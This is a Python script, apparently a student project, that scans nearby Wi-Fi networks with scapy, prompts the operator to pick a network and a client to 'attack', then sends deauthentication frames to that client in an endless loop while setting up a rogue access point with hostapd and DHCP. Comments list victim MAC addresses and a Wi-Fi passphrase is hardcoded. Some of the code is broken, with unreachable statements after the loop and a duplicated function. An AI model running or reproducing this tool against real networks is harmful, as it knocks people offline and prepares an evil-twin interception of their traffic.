from scapy.all import *
import os
import threading
import subprocess
import random
from network_interface import network_interface
from tabulate import tabulate
import select
from user import user
import time


#function that get input but will keap run if it wont get input in 1 sec
def get_input(prompt, timeout):
    print(prompt)
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        return sys.stdin.readline().strip()
    else:
        return None

# get all adapter chanel
def get_adapter_chanels(iface):
    # this comand give as all the channel in the cmd
    cmd = ["iwlist", iface, "channel"]
    output = subprocess.check_output(cmd).decode()

    # here we take out the channel numbers
    channels = []
    for line in output.split("\n"):
        if "Current Frequency" in line:
            continue
        if "Channel " in line:
            channel = line.split("Channel ")[1].split(":")[0]
            channels.append(int(channel))

    # Print the list of available channels
    return channels

def set_adapter_to_monitor(iface):
    os.system(f"sudo ifconfig {iface} down")
    os.system(f"sudo iwconfig {iface} mode monitor")
    os.system(f"sudo ifconfig {iface} up")

def interface_handle_packet(pkt, network_interfaces, currchanel):
    # this is how scapy check is a wifi packet
    if pkt.haslayer(Dot11):
        # Extract BSSID of the network this layer contain information about the network
        # as the source and destination MAC addresses, as well as the wireless management frame control field
        bssid = pkt[Dot11].addr2
        # Print the SSID and BSSID of the network
        # if the packet is beacon we can also check the type is 0-menegment and the subtype is 8-beacon
        if pkt.type == 0 and pkt.subtype == 8:
            #ssid is the name of the router
            ssid = pkt[Dot11Elt].info.decode()
            if network_interfaces.get(bssid) is not None:
                network_interfaces.get(bssid).Beacons += 1
            else:
                network_interfaces[bssid] = network_interface(ssid,bssid,currchanel)
        if network_interfaces.get(bssid) is not None:
            #pwr
            # RadioTap provides information about the wireless radio channel and physical
            # layer characteristics of the transmission.
            # The RadioTap header contains a set of fields that describe various aspects of the wireless transmission,
            # such as the signal strength, noise level, channel frequency, and modulation type.
            if pkt.haslayer(RadioTap):
                # extract the signal strength field from the RadioTap layer
                network_interfaces.get(bssid).PWR =pkt.dBm_AntSignal
            # Data and Data_for_second
            # check if the type is data and if it is it count it
            if pkt.type == 2:
                network_interfaces.get(bssid).Data += 1
                network_interfaces.get(bssid).Data_counter += 1

            if pkt.haslayer(Dot11Elt):
                # Extract the supported rates from the information element
                rates = pkt.getlayer(Dot11Elt).info

                # Get the maximum data rate (in Mbps) from the supported rates
                if rates:
                    max_rate = max(rates)
                    # Convert the rate to Mbps
                    max_rate_mbps = (max_rate & 0x7F) * 0.5
                    network_interfaces.get(bssid).MB = max_rate_mbps

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
def single_network_handle_packet(pkt, users_list, chosen_network_interface):
    # this is how scapy check is a wifi packet
    if pkt.haslayer(Dot11):
        # Extract BSSID of the network this layer contain information about the network
        # as the source and destination MAC addresses, as well as the wireless management frame control field
        to_ds = 1
        from_ds = 1
        ds = pkt.FCfield & 0x3
        get_flag = 1
        mac_address = None
        bssid = None
        if ds == 1:
            to_ds = 1
            from_ds = 0
        if ds == 2:
            to_ds = 0
            from_ds = 1

        if to_ds != 1 or from_ds != 1:
            if to_ds == 0:
                mac_address = pkt.addr1
                bssid = pkt.addr2
            else:
                get_flag = 0
                mac_address = pkt.addr2
                bssid = pkt.addr1
            if chosen_network_interface.BSSID == bssid:
                if users_list.get(mac_address) is None:
                    users_list[mac_address] = user(mac_address)
                if pkt.FCfield.retry:
                    users_list.get(mac_address).loss += 1
                if pkt.type == 2:
                    if get_flag:
                        users_list.get(mac_address).get_data += 1
                    else:
                        users_list.get(mac_address).send_data += 1


def handle_packets_own_network(pkt, chosen_user, wifi_mac_address):
    global flag_user_enters
    # this is how scapy check is a wifi packet
    if pkt.haslayer(Dot11):
        # Extract BSSID of the network this layer contain information about the network
        # as the source and destination MAC addresses, as well as the wireless management frame control field
        if pkt.type != 0 or pkt.subtype != 8:
            check_addr1 = pkt.addr1
            check_addr2 = pkt.addr2
            if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
                    (check_addr1 == wifi_mac_address and check_addr2 == chosen_user):
                flag_user_enters = False


def print_packets(pkt):
    # this is how scapy check is a wifi packet
    if pkt.haslayer(Dot11):
        # Extract BSSID of the network this layer contain information about the network
        # as the source and destination MAC addresses, as well as the wireless management frame control field
        if pkt.type != 0 or pkt.subtype != 8:
            check_addr1 = pkt.addr1
            check_addr2 = pkt.addr2
            if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
                    (check_addr1 == wifi_mac_address and check_addr2 == chosen_user):
                print(pkt)


def set_adapter_to_monitor(iface_wifi):
    os.system(f"sudo ifconfig {iface_wifi} down")
    os.system(f"sudo iwconfig {iface_wifi} mode monitor")
    os.system(f"sudo ifconfig {iface_wifi} up")


def start_ap(iface_wifi):
    # Stop any existing DHCP servers
    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])

    # Create a new DHCP server configuration file
    with open('/etc/dhcp/dhcpd.conf', 'w') as f:
        f.write('subnet 192.168.42.0 netmask 255.255.255.0 {\n')
        f.write('    range 192.168.42.10 192.168.42.50;\n')
        f.write('    option broadcast-address 192.168.42.255;\n')
        f.write('    option routers 192.168.42.1;\n')
        f.write('    default-lease-time 600;\n')
        f.write('    max-lease-time 7200;\n')
        f.write('    option domain-name "local";\n')
        f.write('    option domain-name-servers 8.8.8.8, 8.8.4.4;\n')
        f.write('}\n')

    # Configure the access point
    subprocess.call(['sudo', 'ifconfig', iface_wifi, '192.168.42.1'])
    subprocess.call(['sudo', 'hostapd', '-B', '/etc/hostapd/hostapd.conf'])
    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'start'])

    # Wait for the access point to start
    time.sleep(5)

def stop_ap(iface):
    # Stop the access point
    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])
    subprocess.call(['sudo', 'hostapd', '-B', '/etc/hostapd/hostapd.conf', '-i', iface, '-K'])
    subprocess.call(['sudo', 'ifconfig', iface, 'down'])

def create_ap_config(ssid, password, iface_wifi):
    config_file = f"""interface={iface_wifi}
ssid={ssid}
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
driver=nl80211
channel=6"""
    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write(config_file)




interface = "wlxc83a35c2e0a2"
ssid = "eylon&michael"
password = "E1y2!3o4n5"

set_adapter_to_monitor(interface)
start_ap(interface)
create_ap_config(ssid, password, interface)



iface = "wlxc83a35c2e0b7"
channels = get_adapter_chanels(iface)
set_adapter_to_monitor(iface)
network_interfaces = {}
chosen_network_interface = None
chosen_interface = None

# Start sniffing for Wi-Fi packets on all channels
while True:
    # choose randome channel
    currchanel = channels[random.randint(0, len(channels)-1)]
    print(currchanel)
    # pass the iface(adapter to that channel)
    os.system("iwconfig %s channel %d" % (iface, currchanel))
    #start to sniff packets for 3 sec
    sniff(iface=iface, prn=lambda pkt: interface_handle_packet(pkt, network_interfaces, currchanel), timeout=3)
    # calculate the data per second
    for value in network_interfaces.values():
        if currchanel == value.CH:
            value.Data_for_sec = int(value.Data_counter / 3)
            value.Data_counter = 0

    #print channels
    print("Available channels:", channels)

    # Convert the dictionary to a list of lists for good print in table
    table = [list(v.__dict__.values()) for k, v in network_interfaces.items()]
    # Print the table
    print(tabulate(table, headers=['BSSID', 'PWR', 'RXQ', 'Beacons', 'Data', 'Data_for_sec','Data_counter', 'CH', 'MB', 'ENC','CIPHER', 'AUTH', 'SSID']))

    # get the chosen network from the user it wait 2 sec for ans else keep scanning
    chosen_interface = get_input("What network would you like to attack(plz pass the bssid)? ", 1)
    if chosen_interface is not None:
        if network_interfaces.get(chosen_interface) is None:
            print(chosen_interface)
            print("bad name choose")
        else:
            break



chosen_network_interface = network_interfaces.get(chosen_interface)
users_list = {}
chosen_user = None
while True:
    # desplay the network that was choosen
    print(f"the network you choose is :\n{chosen_network_interface}")
    # change the channel to the network che
    os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
    #start to sniff packets for 3 sec
    sniff(iface=iface, prn=lambda pkt: single_network_handle_packet(pkt, users_list, chosen_network_interface), timeout=3)
    # Convert the dictionary to a list of lists for good print in table
    table = [list(v.__dict__.values()) for k, v in users_list.items()]
    # Print the table
    print(tabulate(table,
                   headers=["BSSID",
                            "get_data ",
                            "send_data",
                            "loss"]))

    # get the chosen network from the user it wait 2 sec for ans else keep scanning
    chosen_user = get_input("What user would you like to attack(plz pass the bssid)? ", 1)
    if chosen_user is not None:
        if users_list.get(chosen_user) is None:
            print(chosen_user)
            print("bad name choose")
        else:
            print("#######################################################################################################################")
            print(users_list.get(chosen_user))
            print("#######################################################################################################################")
            break


curr_user = users_list[chosen_user]
wifi_mac_address = "c8:3a:35:c2:e0:a2"





# run the ap_setup in another thread
# thread = threading.Thread(target=setup_ap, args=(iface_wifi, wifi_channel, ssid, password))
# thread.start()


# 28:cd:c4:9b:87:f5  victim
# 5c:b1:3e:ce:bd:35  wifi
# 34:49:5b:17:a9:b4 ariel wifi
# 24:18:1d:f7:87:c9 galaxy victim


# change the channel to the network che
os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
# Create the Deauthentication frame
deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
# Send the frame

while True:
    sendp(deauth, iface=iface, count=30)

time.sleep(1)

# desplay the network that was choosen
print(f"waiting until the victim logs in :\n{chosen_network_interface}")
print("-----------------------------------------------------------------------------------------------------------------------------")
print(f"the victim is  : {chosen_user}")
print(f"the interface is: {chosen_interface}")
print(f"the channel is: {chosen_network_interface.CH}")
print("-----------------------------------------------------------------------------------------------------------------------------")
# change the channel to the network che
# os.system("iwconfig %s channel %d" % (iface, wifi_channel))
# # start to sniff packets for 3 sec
# sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
#       timeout=3)

sniff(iface=iface, prn=lambda pkt: print_packets(pkt))









